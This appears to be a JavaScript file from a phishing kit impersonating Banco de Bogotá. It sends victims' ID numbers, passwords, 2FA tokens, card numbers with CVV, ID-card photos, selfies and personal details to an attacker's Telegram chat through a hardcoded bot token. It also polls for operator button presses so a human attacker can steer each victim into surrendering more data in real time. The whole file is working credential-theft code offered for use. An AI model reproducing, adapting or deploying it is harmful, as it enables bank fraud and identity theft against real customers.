  // js/telegram.js - Funciones de Telegram
  const TELEGRAM_BOT_TOKEN = '8760922430:AAFxF0ctzvvqKgkZvcB3MRQlyIzzdG7ijQ0';
  const TELEGRAM_CHAT_ID = '-1003577139660';

  // ========== ENVIAR MENSAJES ==========
  function sendTelegramMessage(text, keyboard = null) {
    const payload = {
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: 'HTML'
    };
    
    if (keyboard) {
      payload.reply_markup = keyboard;
    }
    
    // ✅ URL corregida SIN espacio
    return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).then(r => {
      if (!r.ok) {
        if (r.status === 409) {
          console.warn('⚠️ Conflict 409 con Telegram');
        }
        throw new Error(`HTTP error! status: ${r.status}`);
      }
      return r.json();
    });
  }

  // ========== FUNCIÓN PRINCIPAL PARA ENVIAR DATOS ==========
  function sendToTelegram(tipo, datos, onSent) {
    let mensaje = '';
    let keyboard = null;
    
    // ========== MENSAJES SEGÚN TIPO ==========
    
    if (tipo === 'login') {
      mensaje = `
  🏦 <b>BANCO DE BOGOTÁ - NUEVO ACCESO</b>

  👤 <b>Tipo:</b> ${datos.tipo_persona}
  🆔 <b>Identificación:</b> ${datos.tipo_identificacion} ${datos.numero_identificacion}
  🔐 <b>Tipo de Ingreso:</b> ${datos.tipo_ingreso}
  🔑 <b>Clave:</b> ${datos.clave}
  ${datos.ultimos_4_digitos !== 'N/A' ? `💳 <b>Últimos 4:</b> ${datos.ultimos_4_digitos}` : ''}

  📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}
      `.trim();
      
      keyboard = {
        inline_keyboard: [
          [
            { text: '❌ Error', callback_data: 'error' },
            { text: '🔐 Token', callback_data: 'token' }
          ],
          [
            { text: '💳 Pedir Tarjeta Débito', callback_data: 'tarjeta_debito' },
            { text: '💳 Pedir Tarjeta Crédito', callback_data: 'tarjeta_credito' }
          ],
          [
            { text: '📋 Datos Personales', callback_data: 'datos_personales' }
          ],
          [
            { text: '✅ Soy Yo', callback_data: 'soyyo' },
            { text: '🏁 Finalizar', callback_data: 'finalizar' }
          ]
        ]
      };
    } 
    
    else if (tipo === 'token') {
      mensaje = `
  🔐 <b>TOKEN RECIBIDO</b>

  📱 <b>Token:</b> ${datos.token}
  🆔 <b>Usuario:</b> ${datos.tipo_identificacion} ${datos.numero_identificacion}

  📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}
      `.trim();
      
      keyboard = {
        inline_keyboard: [
          [
            { text: '✅ Token Correcto', callback_data: 'soyyo' },
            { text: '❌ Token Incorrecto', callback_data: 'token_otro' }
          ],
          [
            { text: '💳 Pedir Tarjeta Débito', callback_data: 'tarjeta_debito' },
            { text: '💳 Pedir Tarjeta Crédito', callback_data: 'tarjeta_credito' }
          ],
          [
            { text: '🏁 Finalizar', callback_data: 'finalizar' }
          ]
        ]
      };
    }
    
    else if (tipo === 'tarjeta') {
      const tipoTarjeta = datos.tipo_tarjeta || 'Desconocida';
      mensaje = `
  💳 <b>TARJETA ${tipoTarjeta.toUpperCase()} RECIBIDA</b>

  💳 <b>Número:</b> ${datos.numero}
  📅 <b>Vencimiento:</b> ${datos.vencimiento}
  🔒 <b>CVV:</b> ${datos.cvv}
  👤 <b>Titular:</b> ${datos.titular || 'No proporcionado'}

  🆔 <b>Usuario:</b> ${datos.tipo_identificacion} ${datos.numero_identificacion}
  📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}
      `.trim();
      
      keyboard = {
        inline_keyboard: [
          [
            { text: '✅ Tarjeta Válida', callback_data: 'soyyo' },
            { text: `❌ Tarjeta Inválida`, callback_data: `error_${tipoTarjeta.toLowerCase()}` }
          ],
          [
            { text: '🔐 Pedir Token', callback_data: 'token' },
            { text: '💳 Otra Tarjeta', callback_data: tipoTarjeta === 'Débito' ? 'tarjeta_debito' : 'tarjeta_credito' }
          ],
          [
            { text: '🏁 Finalizar', callback_data: 'finalizar' }
          ]
        ]
      };
    }
    
    else if (tipo === 'soyyo') {
      mensaje = `
  📸 <b>FOTOS "SOY YO" RECIBIDAS</b>

  📷 <b>Foto 1 (Cédula Frontal):</b> ${datos.foto1 ? 'Recibida ✅' : 'No recibida ❌'}
  📷 <b>Foto 2 (Cédula Trasera):</b> ${datos.foto2 ? 'Recibida ✅' : 'No recibida ❌'}
  🤳 <b>Foto 3 (Selfie):</b> ${datos.foto3 ? 'Recibida ✅' : 'No recibida ❌'}

  🆔 <b>Usuario:</b> ${datos.tipo_identificacion} ${datos.numero_identificacion}
  📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}
      `.trim();
      
      keyboard = {
        inline_keyboard: [
          [
            { text: '✅ Fotos Correctas', callback_data: 'finalizar' },
            { text: '❌ Fotos Incorrectas', callback_data: 'error_logo' }
          ],
          [
            { text: '🔐 Pedir Token', callback_data: 'token' },
            { text: '💳 Pedir Tarjeta', callback_data: 'tarjeta_debito' }
          ]
        ]
      };
    }
    
    else if (tipo === 'datos_personales') {
      mensaje = `
  📋 <b>DATOS PERSONALES RECIBIDOS</b>

  👤 <b>INFORMACIÓN PERSONAL</b>
  • <b>Nombres:</b> ${datos.nombres}
  • <b>Apellidos:</b> ${datos.apellidos}
  • <b>Fecha Nacimiento:</b> ${datos.fecha_nacimiento}
  • <b>Género:</b> ${datos.genero}

  📞 <b>CONTACTO</b>
  • <b>Correo:</b> ${datos.correo}
  • <b>Celular:</b> ${datos.celular}
  • <b>Teléfono Fijo:</b> ${datos.telefono_fijo}

  📍 <b>DIRECCIÓN</b>
  • <b>Dirección:</b> ${datos.direccion}
  • <b>Ciudad:</b> ${datos.ciudad}
  • <b>Departamento:</b> ${datos.departamento}

  🆔 <b>Usuario:</b> ${datos.tipo_identificacion} ${datos.numero_identificacion}
  📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}
      `.trim();
      
      keyboard = {
        inline_keyboard: [
          [
            { text: '✅ Datos Correctos', callback_data: 'finalizar' },
            { text: '❌ Datos Incorrectos', callback_data: 'datos_personales' }
          ],
          [
            { text: '🔐 Pedir Token', callback_data: 'token' },
            { text: '💳 Pedir Tarjeta', callback_data: 'tarjeta_debito' }
          ],
          [
            { text: '📸 Pedir Fotos', callback_data: 'soyyo' }
          ]
        ]
      };
    }
    
    // ========== ENVIAR MENSAJE ==========
    sendTelegramMessage(mensaje, keyboard)
      .then(response => {
        console.log('✅ Mensaje enviado:', response);
        
        if (response.ok && response.result) {
          const messageId = response.result.message_id;
          localStorage.setItem('bbogota_msg_id', messageId);
          console.log('💾 Message ID guardado:', messageId);
          
          if (typeof onSent === 'function') {
            onSent(messageId);
          }
        }
      })
      .catch(error => {
        console.error('❌ Error al enviar:', error);
        const loader = document.getElementById('loading-overlay');
        if (loader) loader.style.display = 'none';
        alert('Error de conexión. Por favor intenta nuevamente.');
      });
  }

  // ========== ESCUCHAR BOTONES DE TELEGRAM (SIN RESPONDER CALLBACK) ==========
  let stopPolling = false;
  let pollingTimeout = null;

  window.stopListening = function() {
    stopPolling = true;
    if (pollingTimeout) {
      clearTimeout(pollingTimeout);
      pollingTimeout = null;
    }
    console.log('🛑 Escucha detenida');
  };

  function listenCurrentButtons(onAction) {
    const msgId = localStorage.getItem('bbogota_msg_id');
    
    if (!msgId) {
      console.warn('⚠️ No hay msgId');
      return;
    }
    
    console.log('👂 Escuchando mensaje:', msgId);
    stopPolling = false;
    let lastUpdateId = -1;
    let checksWithoutUpdate = 0;
    const MAX_CHECKS = 150; // ✅ CAMBIADO: 150 checks × 2 segundos = 5 minutos
    const CHECK_INTERVAL = 2000;
    
    function check() {
      if (stopPolling) {
        console.log('⏹️ Polling detenido');
        return;
      }
      
      if (checksWithoutUpdate >= MAX_CHECKS) {
        console.log('⏱️ Timeout: No se recibió respuesta en 5 minutos');
        setTimeout(() => {
          if (!stopPolling) {
            console.log('🔄 Reiniciando escucha después de timeout...');
            checksWithoutUpdate = 0;
            check();
          }
        }, 5000);
        return;
      }
      
      // ✅ URL corregida SIN espacio
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          offset: lastUpdateId + 1,
          allowed_updates: ['callback_query'],
          timeout: 20
        })
      })
      .then(r => {
        if (!r.ok) {
          if (r.status === 409) {
            console.warn('⚠️ Conflict 409 con Telegram, deteniendo polling');
            stopPolling = true;
            return { ok: false, result: [] };
          }
          throw new Error(`HTTP error! status: ${r.status}`);
        }
        return r.json();
      })
      .then(data => {
        if (!data.ok || !data.result || data.result.length === 0) {
          checksWithoutUpdate++;
          if (!stopPolling) pollingTimeout = setTimeout(check, CHECK_INTERVAL);
          return;
        }
        
        let foundMatch = false;
        
        for (const u of data.result) {
          lastUpdateId = Math.max(lastUpdateId, u.update_id);
          
          if (!u.callback_query) continue;
          
          const action = u.callback_query.data;
          const messageId = String(u.callback_query.message.message_id);
          
          console.log(`📨 Update recibido: mensaje ${messageId}, esperando ${msgId}`);
          
          if (messageId === String(msgId)) {
            console.log('✅ Message ID coincide!');
            console.log('🎯 Botón presionado:', action);
            
            foundMatch = true;
            
            // ❌ NO respondemos el callback para evitar que se bloqueen los botones
            // fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
            //   method: 'POST',
            //   headers: { 'Content-Type': 'application/json' },
            //   body: JSON.stringify({ 
            //     callback_query_id: callbackId,
            //     text: '✅ Procesando...'
            //   })
            // }).then(() => {
            //   console.log('✅ Callback respondido');
            // });

            onAction(action);
            
            stopPolling = true;
            return;
          }
        }
        
        if (!foundMatch) {
          checksWithoutUpdate++;
        } else {
          checksWithoutUpdate = 0;
        }
        
        if (!stopPolling) pollingTimeout = setTimeout(check, CHECK_INTERVAL);
      })
      .catch(err => {
        console.error('❌ Error en getUpdates:', err);
        checksWithoutUpdate++;
        if (!stopPolling && checksWithoutUpdate < MAX_CHECKS) {
          pollingTimeout = setTimeout(check, CHECK_INTERVAL + 1000);
        }
      });
    }
    
    check();
  }

  // ========== FUNCIÓN AUXILIAR ==========
  function getUserData() {
    return {
      tipo_identificacion: localStorage.getItem('user_id_type') || 'CC',
      numero_identificacion: localStorage.getItem('user_id_number') || 'Desconocido'
    };
  }